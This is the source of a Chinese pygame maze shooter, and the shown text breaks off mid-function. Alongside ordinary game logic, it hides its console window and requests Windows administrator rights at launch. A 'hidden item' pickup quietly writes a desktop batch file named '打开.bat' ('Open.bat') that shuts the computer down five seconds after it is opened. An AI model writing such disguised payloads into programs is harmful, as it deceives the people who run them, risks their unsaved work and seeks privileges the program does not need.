import pygame
import random
import sys
import math
import os
import time
import ctypes
import subprocess

# 隐藏控制台窗口（仅Windows）
def hide_console():
    if os.name == 'nt':
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)
        except:
            pass

# 请求管理员权限（仅Windows）
def request_admin_privileges():
    if os.name == 'nt':
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            else:
                print("请求管理员权限...")
                result = ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                if result > 32:
                    return False
                else:
                    print("管理员权限请求失败，游戏将以普通权限运行")
                    return True
        except Exception as e:
            print(f"权限检查失败: {e}")
            return True
    return True

# 创建关机BAT文件
def create_shutdown_bat():
    try:
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        bat_path = os.path.join(desktop_path, "打开.bat")

        with open(bat_path, 'w', encoding='gbk') as f:
            f.write("@echo off\n")
            f.write("chcp 65001 >nul\n")
            f.write("echo 电脑将在5秒后关机...\n")
            f.write("shutdown /s /t 5\n")
            f.write("echo 如果要取消关机，请按 Ctrl+C\n")
            f.write("pause\n")
        print(f"已创建BAT文件: {bat_path}")
        return True
    except Exception as e:
        print(f"创建BAT文件失败: {e}")
        return False

# 初始化游戏
def initialize_game():
    hide_console()

    if not request_admin_privileges():
        print("正在以管理员权限重新启动...")
        sys.exit()

    try:
        pygame.init()
        pygame.font.init()
        return True
    except Exception as e:
        print(f"Pygame初始化失败: {e}")
        return False

# 获取可用的中文字体
def get_chinese_font(size):
    font_names = [
        'SimHei', 'Microsoft YaHei', 'SimSun', 'KaiTi',
        'FangSong', 'Arial Unicode MS', 'DejaVu Sans'
    ]

    for font_name in font_names:
        try:
            font = pygame.font.SysFont(font_name, size)
            test_surface = font.render('测试', True, (255, 255, 255))
            if test_surface.get_width() > 0:
                return font
        except:
            continue

    try:
        return pygame.font.Font(None, size)
    except:
        return pygame.font.SysFont('Arial', size)

# 游戏常量 - 优化性能
MAP_WIDTH, MAP_HEIGHT = 6000, 4500  # 稍微减小地图尺寸
SCREEN_WIDTH, SCREEN_HEIGHT = 800, 600
PLAYER_SIZE = 25  # 减小尺寸
ENEMY_SIZE = 20
DARK_GREEN = (0, 100, 0)
WALL_SIZE = 35
EXIT_SIZE = 35
PLAYER_SPEED = 6  # 调整速度
ENEMY_SPEED = 2
PLAYER_VISION_RADIUS = 200  # 减小视野范围
ENEMY_VISION = 120
PLAYER_MAX_HEALTH = 100
ENEMY_HEALTH = 25
ENEMY_SHOOTER_HEALTH = 40
ENEMY_TANK_HEALTH = 80
BULLET_SPEED = 8
ENEMY_BULLET_SPEED = 5
BULLET_DAMAGE = 8
ENEMY_BULLET_DAMAGE = 12
TANK_BULLET_DAMAGE = 20
EXPLOSION_DAMAGE = 40
EXPLOSION_RADIUS = 80
EXPLOSION_DURATION = 10  # 进一步减少爆炸时间
BOMB_COOLDOWN = 60  # 减少冷却时间
INVULNERABILITY_TIME = 90
FPS = 60
ENEMY_SPAWN_TIME = 6 * FPS  # 减少生成时间

# 道具相关常量
ITEM_SIZE = 16
ITEM_SPAWN_CHANCE = 0.12
HIDDEN_ITEM_SPAWN_CHANCE = 0.07
ITEM_DURATION = {
    'speed_boost': 8 * FPS,
    'damage_boost': 15 * FPS,
    'health_boost': 0,
    'hidden_item': 45 * FPS
}
ITEM_EFFECT = {
    'speed_boost': 1.8,
    'damage_boost': 1.8,
    'health_boost': 40,
    'hidden_item': 2.2
}

# 颜色定义
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 120, 255)
YELLOW = (255, 255, 0)
PURPLE = (180, 0, 255)
ORANGE = (255, 165, 0)
DARK_RED = (139, 0, 0)
LIGHT_BLUE = (173, 216, 230)
GRAY = (128, 128, 128)
GOLD = (255, 215, 0)
FIRE_ORANGE = (255, 69, 0)
FIRE_YELLOW = (255, 215, 0)
CYAN = (0, 255, 255)
DARK_GRAY = (50, 50, 50)
BUTTON_GREEN = (0, 200, 0)
BUTTON_HOVER = (0, 230, 0)
ITEM_COLORS = {
    'speed_boost': (0, 255, 255),
    'damage_boost': (255, 0, 0),
    'health_boost': (0, 255, 0),
    'hidden_item': (255, 215, 0)
}

# 性能优化：预计算距离表
def distance(p1, p2):
    return math.sqrt((p2[0] - p1[0])**2 + (p2[1] - p1[1])**2)

# 优化视线检测
def has_line_of_sight(point1, point2, walls, max_checks=8):
    dist = distance(point1, point2)
    if dist > 500:  # 限制检测距离
        return False

    steps = min(max_checks, int(dist / 25))  # 动态调整检测步数
    for i in range(steps + 1):
        t = i / steps
        x = point1[0] * (1 - t) + point2[0] * t
        y = point1[1] * (1 - t) + point2[1] * t

        # 使用近似检测
        for wall in walls:
            if (abs(x - wall.centerx) < wall.width/2 + 10 and
                    abs(y - wall.centery) < wall.height/2 + 10):
                return False
    return True

# 检查位置是否在墙上 - 修复：增加更严格的碰撞检测
def is_position_valid(pos, walls, size):
    test_rect = pygame.Rect(pos[0], pos[1], size, size)
    for wall in walls:
        if test_rect.colliderect(wall):
            return False
    return True

# 检查炸弹放置位置是否有效
def is_bomb_position_valid(bomb_pos, player_pos, walls):
    if distance(bomb_pos, player_pos.center) > PLAYER_VISION_RADIUS:
        return False
    return has_line_of_sight(player_pos.center, bomb_pos, walls, 5)

# 生成随机迷宫和建筑物 - 增加数量但优化生成
def generate_maze():
    walls = []

    # 外围墙壁
    for x in range(0, MAP_WIDTH, WALL_SIZE):
        walls.append(pygame.Rect(x, 0, WALL_SIZE, WALL_SIZE))
        walls.append(pygame.Rect(x, MAP_HEIGHT - WALL_SIZE, WALL_SIZE, WALL_SIZE))
    for y in range(0, MAP_HEIGHT, WALL_SIZE):
        walls.append(pygame.Rect(0, y, WALL_SIZE, WALL_SIZE))
        walls.append(pygame.Rect(MAP_WIDTH - WALL_SIZE, y, WALL_SIZE, WALL_SIZE))

    # 内部随机墙壁 - 增加数量但优化分布
    for _ in range(400):  # 增加墙壁数量
        x = random.randint(2, (MAP_WIDTH - WALL_SIZE * 2) // WALL_SIZE) * WALL_SIZE
        y = random.randint(2, (MAP_HEIGHT - WALL_SIZE * 2) // WALL_SIZE) * WALL_SIZE
        width = random.randint(1, 6) * WALL_SIZE  # 减小最大长度
        height = WALL_SIZE
        if random.random() > 0.5:
            width, height = height, width

        new_wall = pygame.Rect(x, y, width, height)

        # 检查是否与现有墙壁太近
        too_close = False
        for wall in walls[-20:]:  # 只检查最近的墙壁
            if (abs(new_wall.centerx - wall.centerx) < 100 and
                    abs(new_wall.centery - wall.centery) < 100):
                too_close = True
                break

        if not too_close:
            walls.append(new_wall)

    # 生成建筑物 - 增加数量
    for _ in range(60):  # 增加建筑物数量
        building_width = random.randint(3, 6) * WALL_SIZE
        building_height = random.randint(3, 6) * WALL_SIZE
        x = random.randint(100, MAP_WIDTH - building_width - 100)
        y = random.randint(100, MAP_HEIGHT - building_height - 100)

        building_walls = [
            pygame.Rect(x, y, building_width, WALL_SIZE),
            pygame.Rect(x, y + building_height - WALL_SIZE, building_width, WALL_SIZE),
            pygame.Rect(x, y, WALL_SIZE, building_height),
            pygame.Rect(x + building_width - WALL_SIZE, y, WALL_SIZE, building_height),
        ]

        walls.extend(building_walls)

    return walls

# 生成道具
def generate_items(walls, player_pos, exit_pos, count=25):  # 增加道具数量
    items = []
    positions_used = set()

    for _ in range(count):
        attempts = 0
        while attempts < 20:
            x = random.randint(100, MAP_WIDTH - 100)
            y = random.randint(100, MAP_HEIGHT - 100)

            # 避免位置重复
            pos_key = (x // 50, y // 50)  # 粗略位置分组
            if pos_key in positions_used:
                attempts += 1
                continue

            item_rect = pygame.Rect(x, y, ITEM_SIZE, ITEM_SIZE)

            if (is_position_valid((x, y), walls, ITEM_SIZE) and
                    distance(item_rect.center, player_pos.center) > 200 and
                    distance(item_rect.center, exit_pos.center) > 200):
                positions_used.add(pos_key)
                break
            attempts += 1
        else:
            continue

        if random.random() < HIDDEN_ITEM_SPAWN_CHANCE:
            item_type = 'hidden_item'
        elif random.random() < ITEM_SPAWN_CHANCE:
            item_type = random.choice(['speed_boost', 'damage_boost', 'health_boost'])
        else:
            continue

        items.append({
            'rect': item_rect,
            'type': item_type,
            'color': ITEM_COLORS[item_type]
        })

    return items

# 生成敌人 - 增加数量
def generate_enemies(num_enemies, walls, player_pos, exit_pos, enemy_type="normal"):
    enemies = []
    positions_used = set()

    for _ in range(num_enemies):
        attempts = 0
        while attempts < 30:
            x = random.randint(100, MAP_WIDTH - 100)
            y = random.randint(100, MAP_HEIGHT - 100)

            pos_key = (x // 100, y // 100)
            if pos_key in positions_used:
                attempts += 1
                continue

            enemy_rect = pygame.Rect(x, y, ENEMY_SIZE, ENEMY_SIZE)

            if (is_position_valid((x, y), walls, ENEMY_SIZE) and
                    distance(enemy_rect.center, player_pos.center) > 300 and
                    distance(enemy_rect.center, exit_pos.center) > 300):
                positions_used.add(pos_key)
                break
            attempts += 1
        else:
            continue

        if enemy_type == "shooter":
            health = ENEMY_SHOOTER_HEALTH
            is_shooter = True
            is_tank = False
        elif enemy_type == "tank":
            health = ENEMY_TANK_HEALTH
            is_shooter = False
            is_tank = True
        else:
            health = ENEMY_HEALTH
            is_shooter = False
            is_tank = False

        enemy_data = {
            'rect': enemy_rect,
            'state': 'patrol',
            'patrol_target': (random.randint(50, MAP_WIDTH - 50), random.randint(50, MAP_HEIGHT - 50)),
            'patrol_timer': random.randint(80, 150),
            'last_seen_pos': None,
            'search_timer': 0,
            'home_pos': (x, y),
            'health': health,
            'is_shooter': is_shooter,
            'is_tank': is_tank,
            'shoot_cooldown': 0
        }
        enemies.append(enemy_data)
    return enemies

# 生成玩家和出口 - 修复：增加更严格的位置验证
def generate_player_and_exit(walls):
    attempts = 0
    while attempts < 100:  # 增加尝试次数
        player_pos = pygame.Rect(
            random.randint(200, MAP_WIDTH - 200),
            random.randint(200, MAP_HEIGHT - 200),
            PLAYER_SIZE,
            PLAYER_SIZE
        )

        # 修复：增加更严格的玩家位置验证
        if not is_position_valid(player_pos.topleft, walls, PLAYER_SIZE):
            attempts += 1
            continue

        min_distance = math.sqrt(MAP_WIDTH**2 + MAP_HEIGHT**2) / 3

        exit_attempts = 0
        while exit_attempts < 50:  # 增加尝试次数
            exit_pos = pygame.Rect(
                random.randint(200, MAP_WIDTH - 200),
                random.randint(200, MAP_HEIGHT - 200),
                EXIT_SIZE,
                EXIT_SIZE
            )

            # 修复：增加更严格的出口位置验证
            if (is_position_valid(exit_pos.topleft, walls, EXIT_SIZE) and
                    distance(player_pos.center, exit_pos.center) >= min_distance):
                return player_pos, exit_pos
            exit_attempts += 1
        attempts += 1

    # 如果找不到合适位置，使用默认位置并确保不在墙上
    player_pos = pygame.Rect(200, 200, PLAYER_SIZE, PLAYER_SIZE)
    exit_pos = pygame.Rect(MAP_WIDTH - 300, MAP_HEIGHT - 300, EXIT_SIZE, EXIT_SIZE)

    # 确保默认位置有效
    while not is_position_valid(player_pos.topleft, walls, PLAYER_SIZE):
        player_pos.x += 50
        player_pos.y += 50
        if player_pos.x > MAP_WIDTH - 200 or player_pos.y > MAP_HEIGHT - 200:
            player_pos.x = 200
            player_pos.y = 200

    while not is_position_valid(exit_pos.topleft, walls, EXIT_SIZE):
        exit_pos.x -= 50
        exit_pos.y -= 50
        if exit_pos.x < 200 or exit_pos.y < 200:
            exit_pos.x = MAP_WIDTH - 300
            exit_pos.y = MAP_HEIGHT - 300

    return player_pos, exit_pos

# 优化敌人AI
def update_enemy_ai(enemy, player, walls, enemy_bullets):
    player_center = player.center
    enemy_center = enemy['rect'].center

    # 简化距离计算
    dx = player_center[0] - enemy_center[0]
    dy = player_center[1] - enemy_center[1]
    dist_sq = dx*dx + dy*dy

    if dist_sq < ENEMY_VISION * ENEMY_VISION:
        can_see_player = has_line_of_sight(enemy_center, player_center, walls, 6)

        if can_see_player:
            enemy['state'] = 'chase'
            enemy['last_seen_pos'] = player_center
            enemy['search_timer'] = 80

            if (enemy['is_shooter'] or enemy['is_tank']) and enemy['shoot_cooldown'] <= 0:
                dist = math.sqrt(dist_sq)
                if enemy['is_tank']:
                    speed = ENEMY_BULLET_SPEED * 0.6
                    damage = TANK_BULLET_DAMAGE
                    cooldown = 150
                else:
                    speed = ENEMY_BULLET_SPEED
                    damage = ENEMY_BULLET_DAMAGE
                    cooldown = 100

                enemy_bullets.append({
                    'rect': pygame.Rect(enemy_center[0] - 3, enemy_center[1] - 3, 6, 6),
                    'dx': dx / dist * speed,
                    'dy': dy / dist * speed,
                    'is_enemy_bullet': True,
                    'damage': damage
                })
                enemy['shoot_cooldown'] = cooldown

    elif enemy['state'] == 'chase':
        enemy['state'] = 'search'
        enemy['search_timer'] = 80
    elif enemy['state'] == 'search' and enemy['search_timer'] <= 0:
        enemy['state'] = 'return'
    elif enemy['state'] == 'return' and distance(enemy_center, enemy['home_pos']) < 20:
        enemy['state'] = 'patrol'

    if enemy['state'] == 'patrol':
        enemy['patrol_timer'] -= 1
        if enemy['patrol_timer'] <= 0 or distance(enemy_center, enemy['patrol_target']) < 20:
            enemy['patrol_target'] = (random.randint(100, MAP_WIDTH - 100), random.randint(100, MAP_HEIGHT - 100))
            enemy['patrol_timer'] = random.randint(80, 150)
        target = enemy['patrol_target']
    elif enemy['state'] == 'chase':
        target = player_center
    elif enemy['state'] == 'search':
        enemy['search_timer'] -= 1
        target = enemy['last_seen_pos'] if enemy['last_seen_pos'] else enemy['home_pos']
    elif enemy['state'] == 'return':
        target = enemy['home_pos']
    else:
        target = enemy['home_pos']

    tdx = target[0] - enemy_center[0]
    tdy = target[1] - enemy_center[1]
    tdist = math.sqrt(tdx*tdx + tdy*tdy)

    if tdist > 0:
        speed = ENEMY_SPEED * 0.5 if enemy['is_tank'] else ENEMY_SPEED
        return tdx / tdist * speed, tdy / tdist * speed

    return 0, 0

# 简化敌人移动
def move_enemy(enemy, dx, dy, walls):
    if dx == 0 and dy == 0:
        return

    original_x = enemy['rect'].x
    original_y = enemy['rect'].y

    enemy['rect'].x += dx
    enemy['rect'].y += dy

    # 简化碰撞检测
    for wall in walls:
        if enemy['rect'].colliderect(wall):
            enemy['rect'].x = original_x
            enemy['rect'].y = original_y
            return

# 绘制视野限制效果
def draw_vision_effect(surface, player_center, vision_radius):
    darkness = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
    darkness.fill((0, 0, 0, 180))  # 降低透明度

    pygame.draw.circle(darkness, (0, 0, 0, 0),
                       (SCREEN_WIDTH // 2, SCREEN_HEIGHT // 2), vision_radius)

    surface.blit(darkness, (0, 0))

# 创建按钮类
class Button:
    def __init__(self, x, y, width, height, text, color=BUTTON_GREEN, hover_color=BUTTON_HOVER):
        self.rect = pygame.Rect(x, y, width, height)
        self.text = text
        self.color = color
        self.hover_color = hover_color
        self.current_color = color
        self.font = get_chinese_font(24)  # 减小字体

    def draw(self, surface):
        pygame.draw.rect(surface, self.current_color, self.rect, border_radius=8)
        pygame.draw.rect(surface, BLACK, self.rect, 2, border_radius=8)

        text_surf = self.font.render(self.text, True, BLACK)
        text_rect = text_surf.get_rect(center=self.rect.center)
        surface.blit(text_surf, text_rect)

    def check_hover(self, pos):
        if self.rect.collidepoint(pos):
            self.current_color = self.hover_color
            return True
        else:
            self.current_color = self.color
            return False

    def is_clicked(self, pos, event):
        if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
            return self.rect.collidepoint(pos)
        return False

# 简化开始界面 - 修复：调整按钮位置不挡住文字
def show_start_screen(screen):
    # 修复：调整按钮位置，放在控制说明下方
    start_button = Button(SCREEN_WIDTH//2 - 80, SCREEN_HEIGHT//2 + 180, 160, 40, "开始游戏")
    quit_button = Button(SCREEN_WIDTH//2 - 80, SCREEN_HEIGHT//2 + 240, 160, 40, "退出游戏", RED, (255, 100, 100))

    font_large = get_chinese_font(48)  # 减小字体
    font_medium = get_chinese_font(20)

    while True:
        screen.fill(BLACK)

        title = font_large.render("迷宫探险家", True, GREEN)
        subtitle = font_medium.render("增强版", True, YELLOW)

        screen.blit(title, (SCREEN_WIDTH//2 - title.get_width()//2, SCREEN_HEIGHT//4))
        screen.blit(subtitle, (SCREEN_WIDTH//2 - subtitle.get_width()//2, SCREEN_HEIGHT//4 + 60))

        # 简化控制说明
        controls = [
            "WASD - 移动",
            "鼠标左键 - 射击",
            "鼠标右键 - 炸弹",
            "数字键1-8 - 道具",
            "R键 - 重新开始"
        ]

        for i, line in enumerate(controls):
            text = font_medium.render(line, True, WHITE)
            screen.blit(text, (SCREEN_WIDTH//2 - text.get_width()//2, SCREEN_HEIGHT//3 + 80 + i*25))

        mouse_pos = pygame.mouse.get_pos()
        start_button.check_hover(mouse_pos)
        quit_button.check_hover(mouse_pos)

        start_button.draw(screen)
        quit_button.draw(screen)

        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return False

            if start_button.is_clicked(mouse_pos, event):
                return True
            if quit_button.is_clicked(mouse_pos, event):
                return False

# 游戏初始化
def init_game():
    walls = generate_maze()
    player, exit_rect = generate_player_and_exit(walls)

    items = generate_items(walls, player, exit_rect, 25)

    # 增加敌人数量
    enemies = generate_enemies(10, walls, player, exit_rect, "normal")
    shooter_enemies = generate_enemies(6, walls, player, exit_rect, "shooter")
    tank_enemies = generate_enemies(3, walls, player, exit_rect, "tank")

    enemies.extend(shooter_enemies)
    enemies.extend(tank_enemies)

    player_health = PLAYER_MAX_HEALTH
    invulnerability_timer = INVULNERABILITY_TIME
    bullets = []
    enemy_bullets = []
    bombs = []
    explosions = []
    bomb_cooldown = 0
    enemy_spawn_timer = ENEMY_SPAWN_TIME
    score = 0
    level = 1
    game_over = False
    victory = False

    inventory = [None] * 8
    active_effects = {
        'speed_boost': {'timer': 0, 'multiplier': 1.0},
        'damage_boost': {'timer': 0, 'multiplier': 1.0}
    }

    camera_x = player.centerx - SCREEN_WIDTH // 2
    camera_y = player.centery - SCREEN_HEIGHT // 2

    hidden_item_message = ""
    hidden_item_message_timer = 0

    return {
        'walls': walls,
        'player': player,
        'exit_rect': exit_rect,
        'enemies': enemies,
        'items': items,
        'player_health': player_health,
        'invulnerability_timer': invulnerability_timer,
        'bullets': bullets,
        'enemy_bullets': enemy_bullets,
        'bombs': bombs,
        'explosions': explosions,
        'bomb_cooldown': bomb_cooldown,
        'enemy_spawn_timer': enemy_spawn_timer,
        'score': score,
        'level': level,
        'game_over': game_over,
        'victory': victory,
        'camera_x': camera_x,
        'camera_y': camera_y,
        'inventory': inventory,
        'active_effects': active_effects,
        'hidden_item_message': hidden_item_message,
        'hidden_item_message_timer': hidden_item_message_timer
    }

# 主游戏函数
def main():
    if not initialize_game():
        print("游戏初始化失败")
        return

    try:
        screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
        pygame.display.set_caption("迷宫探险家")
        clock = pygame.time.Clock()
    except Exception as e:
        print(f"创建游戏窗口失败: {e}")
        return

    map_surface = pygame.Surface((MAP_WIDTH, MAP_HEIGHT))

    if not show_start_screen(screen):
        pygame.quit()
        return

    game_state = init_game()

    # 性能优化：限制每帧处理数量
    max_bullets_per_frame = 5
    max_enemies_per_frame = 3

    running = True
    frame_count = 0

    while running:
        frame_count += 1
        current_time = pygame.time.get_ticks()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

            if event.type == pygame.MOUSEBUTTONDOWN and not game_state['game_over'] and not game_state['victory']:
                if event.button == 1 and len(game_state['bullets']) < 20:  # 限制子弹数量
                    mouse_x, mouse_y = pygame.mouse.get_pos()
                    map_mouse_x = mouse_x + game_state['camera_x']
                    map_mouse_y = mouse_y + game_state['camera_y']

                    dx = map_mouse_x - game_state['player'].centerx
                    dy = map_mouse_y - game_state['player'].centery
                    dist = max(1, distance(game_state['player'].center, (map_mouse_x, map_mouse_y)))
                    game_state['bullets'].append({
                        'rect': pygame.Rect(game_state['player'].centerx - 2, game_state['player'].centery - 2, 4, 4),
                        'dx': dx / dist * BULLET_SPEED,
                        'dy': dy / dist * BULLET_SPEED,
                        'is_enemy_bullet': False,
                        'damage': BULLET_DAMAGE * game_state['active_effects']['damage_boost']['multiplier']
                    })

                elif event.button == 3 and game_state['bomb_cooldown'] <= 0 and len(game_state['bombs']) < 3:
                    mouse_x, mouse_y = pygame.mouse.get_pos()
                    map_mouse_x = mouse_x + game_state['camera_x']
                    map_mouse_y = mouse_y + game_state['camera_y']

                    if is_bomb_position_valid((map_mouse_x, map_mouse_y), game_state['player'], game_state['walls']):
                        game_state['bombs'].append({
                            'rect': pygame.Rect(map_mouse_x - 8, map_mouse_y - 8, 16, 16),
                            'timer': 45
                        })
                        game_state['bomb_cooldown'] = BOMB_COOLDOWN

            if event.type == pygame.KEYDOWN and not game_state['game_over'] and not game_state['victory']:
                if event.key in [pygame.K_1, pygame.K_2, pygame.K_3, pygame.K_4,
                                 pygame.K_5, pygame.K_6, pygame.K_7, pygame.K_8]:
                    slot = event.key - pygame.K_1
                    if game_state['inventory'][slot] is not None:
                        item_type = game_state['inventory'][slot]

                        if item_type == 'speed_boost':
                            game_state['active_effects']['speed_boost']['timer'] = ITEM_DURATION['speed_boost']
                            game_state['active_effects']['speed_boost']['multiplier'] = ITEM_EFFECT['speed_boost']
                        elif item_type == 'damage_boost':
                            game_state['active_effects']['damage_boost']['timer'] = ITEM_DURATION['damage_boost']
                            game_state['active_effects']['damage_boost']['multiplier'] = ITEM_EFFECT['damage_boost']
                        elif item_type == 'health_boost':
                            game_state['player_health'] = min(PLAYER_MAX_HEALTH,
                                                              game_state['player_health'] + ITEM_EFFECT['health_boost'])
                        elif item_type == 'hidden_item':
                            game_state['active_effects']['speed_boost']['timer'] = ITEM_DURATION['hidden_item']
                            game_state['active_effects']['speed_boost']['multiplier'] = ITEM_EFFECT['hidden_item']
                            game_state['hidden_item_message'] = "隐藏道具! 桌面创建BAT文件!"
                            game_state['hidden_item_message_timer'] = 3 * FPS
                            create_shutdown_bat()

                        game_state['inventory'][slot] = None

            if event.type == pygame.KEYDOWN and (game_state['game_over'] or game_state['victory']):
                if event.key == pygame.K_r:
                    if game_state['victory']:
                        game_state['level'] += 1
                        game_state['score'] += 100 * game_state['level']

                    new_state = init_game()
                    new_state['score'] = game_state['score']
                    new_state['level'] = game_state['level']
                    game_state = new_state

        if not game_state['game_over'] and not game_state['victory']:
            # 更新相机位置
            game_state['camera_x'] = game_state['player'].centerx - SCREEN_WIDTH // 2
            game_state['camera_y'] = game_state['player'].centery - SCREEN_HEIGHT // 2

            game_state['camera_x'] = max(0, min(game_state['camera_x'], MAP_WIDTH - SCREEN_WIDTH))
            game_state['camera_y'] = max(0, min(game_state['camera_y'], MAP_HEIGHT - SCREEN_HEIGHT))

            # 更新计时器
            if game_state['invulnerability_timer'] > 0:
                game_state['invulnerability_timer'] -= 1
            if game_state['bomb_cooldown'] > 0:
                game_state['bomb_cooldown'] -= 1

            # 更新效果
            for effect in game_state['active_effects']:
                if game_state['active_effects'][effect]['timer'] > 0:
                    game_state['active_effects'][effect]['timer'] -= 1
                    if game_state['active_effects'][effect]['timer'] <= 0:
                        game_state['active_effects'][effect]['multiplier'] = 1.0

            if game_state['hidden_item_message_timer'] > 0:
                game_state['hidden_item_message_timer'] -= 1

            # 敌人生成
            game_state['enemy_spawn_timer'] -= 1
            if game_state['enemy_spawn_timer'] <= 0 and len(game_state['enemies']) < 30:  # 限制敌人总数
                enemy_type = random.choice(["normal", "shooter", "tank"])
                new_enemy = generate_enemies(1, game_state['walls'], game_state['player'], game_state['exit_rect'], enemy_type)
                game_state['enemies'].extend(new_enemy)
                game_state['enemy_spawn_timer'] = ENEMY_SPAWN_TIME

            # 玩家移动
            keys = pygame.key.get_pressed()
            dx, dy = 0, 0
            if keys[pygame.K_LEFT] or keys[pygame.K_a]:
                dx = -PLAYER_SPEED
            if keys[pygame.K_RIGHT] or keys[pygame.K_d]:
                dx = PLAYER_SPEED
            if keys[pygame.K_UP] or keys[pygame.K_w]:
                dy = -PLAYER_SPEED
            if keys[pygame.K_DOWN] or keys[pygame.K_s]:
                dy = PLAYER_SPEED

            speed_multiplier = game_state['active_effects']['speed_boost']['multiplier']
            dx *= speed_multiplier
            dy *= speed_multiplier

            # 移动玩家
            game_state['player'].x += dx
            for wall in game_state['walls']:
                if game_state['player'].colliderect(wall):
                    game_state['player'].x -= dx
                    break

            game_state['player'].y += dy
            for wall in game_state['walls']:
                if game_state['player'].colliderect(wall):
                    game_state['player'].y -= dy
                    break

            # 道具拾取
            for item in game_state['items'][:]:
                if game_state['player'].colliderect(item['rect']):
                    for i in range(len(game_state['inventory'])):
                        if game_state['inventory'][i] is None:
                            game_state['inventory'][i] = item['type']
                            game_state['items'].remove(item)
                            break
                    break

            # 更新炸弹和爆炸
            for bomb in game_state['bombs'][:]:
                bomb['timer'] -= 1
                if bomb['timer'] <= 0:
                    game_state['explosions'].append({
                        'rect': pygame.Rect(bomb['rect'].x - EXPLOSION_RADIUS//2, bomb['rect'].y - EXPLOSION_RADIUS//2,
                                            EXPLOSION_RADIUS, EXPLOSION_RADIUS),
                        'timer': EXPLOSION_DURATION
                    })
                    game_state['bombs'].remove(bomb)

            # 处理爆炸
            for explosion in game_state['explosions'][:]:
                explosion['timer'] -= 1
                if explosion['timer'] <= 0:
                    game_state['explosions'].remove(explosion)
                    continue

                for enemy in game_state['enemies'][:]:
                    if explosion['rect'].colliderect(enemy['rect']):
                        enemy['health'] -= EXPLOSION_DAMAGE
                        if enemy['health'] <= 0:
                            game_state['enemies'].remove(enemy)
                            game_state['score'] += 10

                if explosion['rect'].colliderect(game_state['player']) and game_state['invulnerability_timer'] <= 0:
                    game_state['player_health'] -= EXPLOSION_DAMAGE
                    game_state['invulnerability_timer'] = INVULNERABILITY_TIME

            # 更新子弹
            for bullet in game_state['bullets'][:]:
                bullet['rect'].x += bullet['dx']
                bullet['rect'].y += bullet['dy']

                # 边界检查
                if (bullet['rect'].x < 0 or bullet['rect'].x > MAP_WIDTH or
                        bullet['rect'].y < 0 or bullet['rect'].y > MAP_HEIGHT):
                    game_state['bullets'].remove(bullet)
                    continue

                # 墙壁碰撞
                hit_wall = False
                for wall in game_state['walls']:
                    if bullet['rect'].colliderect(wall):
                        hit_wall = True
                        break
                if hit_wall:
                    game_state['bullets'].remove(bullet)
                    continue

                # 敌人碰撞
                for enemy in game_state['enemies'][:]:
                    if bullet['rect'].colliderect(enemy['rect']):
                        enemy['health'] -= bullet['damage']
                        if enemy['health'] <= 0:
                            game_state['enemies'].remove(enemy)
                            game_state['score'] += 10
                        if bullet in game_state['bullets']:
                            game_state['bullets'].remove(bullet)
                        break

            # 更新敌人子弹
            for bullet in game_state['enemy_bullets'][:]:
                bullet['rect'].x += bullet['dx']
                bullet['rect'].y += bullet['dy']

                if (bullet['rect'].x < 0 or bullet['rect'].x > MAP_WIDTH or
                        bullet['rect'].y < 0 or bullet['rect'].y > MAP_HEIGHT):
                    game_state['enemy_bullets'].remove(bullet)
                    continue

                hit_wall = False
                for wall in game_state['walls']:
                    if bullet['rect'].colliderect(wall):
                        hit_wall = True
                        break
                if hit_wall:
                    game_state['enemy_bullets'].remove(bullet)
                    continue

                if bullet['rect'].colliderect(game_state['player']) and game_state['invulnerability_timer'] <= 0:
                    game_state['player_health'] -= bullet['damage']
                    game_state['invulnerability_timer'] = INVULNERABILITY_TIME
                    game_state['enemy_bullets'].remove(bullet)

            # 更新敌人
            for enemy in game_state['enemies'][:]:
                if enemy['shoot_cooldown'] > 0:
                    enemy['shoot_cooldown'] -= 1

                dx, dy = update_enemy_ai(enemy, game_state['player'], game_state['walls'], game_state['enemy_bullets'])
                move_enemy(enemy, dx, dy, game_state['walls'])

                if enemy['rect'].colliderect(game_state['player']) and game_state['invulnerability_timer'] <= 0:
                    game_state['player_health'] -= 5
                    game_state['invulnerability_timer'] = INVULNERABILITY_TIME

            # 检查游戏状态
            if game_state['player_health'] <= 0:
                game_state['game_over'] = True

            if game_state['player'].colliderect(game_state['exit_rect']):
                game_state['victory'] = True

        # 绘制游戏
        map_surface.fill(DARK_GREEN)

        # 绘制墙壁
        for wall in game_state['walls']:
            pygame.draw.rect(map_surface, DARK_GRAY, wall)

        # 绘制出口
        pygame.draw.rect(map_surface, GOLD, game_state['exit_rect'])

        # 绘制道具
        for item in game_state['items']:
            pygame.draw.rect(map_surface, item['color'], item['rect'])

        # 绘制炸弹
        for bomb in game_state['bombs']:
            pygame.draw.rect(map_surface, ORANGE, bomb['rect'])

        # 绘制爆炸
        for explosion in game_state['explosions']:
            alpha = int(255 * explosion['timer'] / EXPLOSION_DURATION)
            explosion_surface = pygame.Surface((EXPLOSION_RADIUS, EXPLOSION_RADIUS), pygame.SRCALPHA)
            pygame.draw.circle(explosion_surface, (*FIRE_ORANGE, alpha),
                               (EXPLOSION_RADIUS//2, EXPLOSION_RADIUS//2), EXPLOSION_RADIUS//2)
            map_surface.blit(explosion_surface, explosion['rect'])

        # 绘制子弹
        for bullet in game_state['bullets']:
            pygame.draw.rect(map_surface, YELLOW, bullet['rect'])

        for bullet in game_state['enemy_bullets']:
            pygame.draw.rect(map_surface, RED, bullet['rect'])

        # 绘制敌人
        for enemy in game_state['enemies']:
            if enemy['is_shooter']:
                color = PURPLE
            elif enemy['is_tank']:
                color = DARK_RED
            else:
                color = RED
            pygame.draw.rect(map_surface, color, enemy['rect'])

            # 绘制血条
            if enemy['is_tank']:
                health_ratio = enemy['health'] / ENEMY_TANK_HEALTH
            elif enemy['is_shooter']:
                health_ratio = enemy['health'] / ENEMY_SHOOTER_HEALTH
            else:
